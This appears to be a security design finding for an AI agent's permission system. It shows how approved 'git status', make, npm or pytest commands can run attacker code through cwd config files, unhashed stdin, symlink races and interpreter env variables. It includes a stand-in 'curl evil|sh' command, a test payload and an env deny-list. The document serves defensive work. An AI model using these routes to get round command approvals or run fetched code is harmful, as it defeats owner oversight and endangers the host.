# design-14: exec and file-write bindings cover the command, not what it will do

**Severity:** High. **Surface:** `exec_host` `always` grants, sandbox `exec`, `write_file` / `edit_file`. **Docs:** 05 §3.4, §3.5 (exec, write_file rows), §5.1, §5.4; 04 §4.2. **Owners:** S05, S21.

## Attack

1. **Same argv, different program.** `exec_host` `always` grants bind argv + cwd + resolved executable (+ binary SHA-256) + env subset. Many programs read code from **cwd**:
   - `git status` runs `core.fsmonitor` from `.git/config`. Verified on git 2.54: `safe.directory` does not help for a repo owned by the same user. `git log` / `git diff` run `core.pager` and `diff.external`. `git commit` runs hooks.
   - `make test` runs the Makefile; `npm test` / `pnpm test` run `package.json` scripts; `pytest` imports `conftest.py`; `cargo build` runs `build.rs`; `direnv` runs `.envrc`.

   The owner approves `always: git status in ~/Projects/app`. Later, in a tainted turn, the agent edits `.git/config` (a granted-folder `write`, often covered by a folder grant), and the next `git status` runs `sh -c "curl evil|sh"` on the host. srt limits the damage unless the card was approved `UNSANDBOXED`; either way the exact-argv check passes.
2. **stdin is not in the hash.** If `exec` accepts `stdin` (needed for `python -`, `sh -s`, `psql -f -`, `node -`), an approved `["python3","-"]` runs arbitrary code. `ExecRequest` has no `stdin` today, but the PTY mode (§5.4) is one: an agent PTY with a `session` approval accepts any keystrokes.
3. **write_file symlink TOCTOU.** The hash covers the "real path" (05) or "absolute path" (04), resolved at approval time. Between `verifyBinding` and `open()`, a sandbox process or a background task replaces `granted/out.txt` with a symlink to `~/.zshrc` (or the granted folder holds a symlink to outside it). A plain `fs.writeFile` follows the link. `edit_file` has the same race between read and write.
4. **Interpreter flags in an env subset.** The env is hashed, but `PYTHONSTARTUP`, `NODE_OPTIONS`, `GIT_CONFIG_*`, `LD_PRELOAD` / `DYLD_*`, `BASH_ENV` and `PERL5OPT` turn an approved env value into code execution. Listing them on the card means little to most owners.

## Assumption broken

"Exact argv" makes a command reviewable. For tools that read their configuration from cwd, the reviewed object is argv **plus the files in cwd**.

## Proposed control

- `exec_host` `always` grants are refused for executables on a cwd-config list (git, make, npm/pnpm/yarn, node, python, pytest, cargo, bundle, direnv, …) unless the grant also binds the hashes of the known config files (`.git/config`, `.git/hooks/*`, `Makefile`, `package.json`, `conftest.py`, …). Any change → `ask`. In a tainted Task, a write to any of those files revokes the matching `exec_host` grants.
- Run host git with `-c core.fsmonitor= -c core.hooksPath=/dev/null -c core.pager=cat` by default, the way IDEs do for untrusted repos.
- `stdin` (when added) is part of the binding hash. An agent PTY is `once` per command line, not `session`.
- Writes use `openat` with `O_NOFOLLOW` on every component (`O_NOFOLLOW_ANY` on macOS 11+, `openat2(RESOLVE_NO_SYMLINKS|RESOLVE_BENEATH)` on Linux). Re-check the realpath against the grant root after open (`fstat` plus `F_GETPATH`).
- Deny-list dangerous env names in the exec env subset (`LD_*`, `DYLD_*`, `*_OPTIONS`, `PYTHONSTARTUP`, `BASH_ENV`, `GIT_*`) unless the owner types them.

## Test case

| # | Setup | Action | Expected |
| --- | --- | --- | --- |
| 1 | `always` grant `exec_host ["git","status"]` in `/tmp/r` | tainted `edit_file /tmp/r/.git/config` adds `fsmonitor = touch /tmp/pwned`, then `git status` | `ask` (config hash changed); `/tmp/pwned` does not exist |
| 2 | same grant, untainted | `git status` | runs with `-c core.fsmonitor=`; `/tmp/pwned` absent |
| 3 | approved `write_file granted/out.txt` | before dispatch, replace `out.txt` with a symlink to `$HOME/.zshrc` | write fails (`ELOOP`/`binding_mismatch`); `.zshrc` unchanged |
| 4 | `exec {argv:["python3","-"], stdin:"A"}` approved | dispatch with `stdin:"B"` | `binding_mismatch` |
| 5 | exec env `{PYTHONSTARTUP:"/workspace/x.py"}` from the agent | decide | `denied` (`dangerous_env`) |
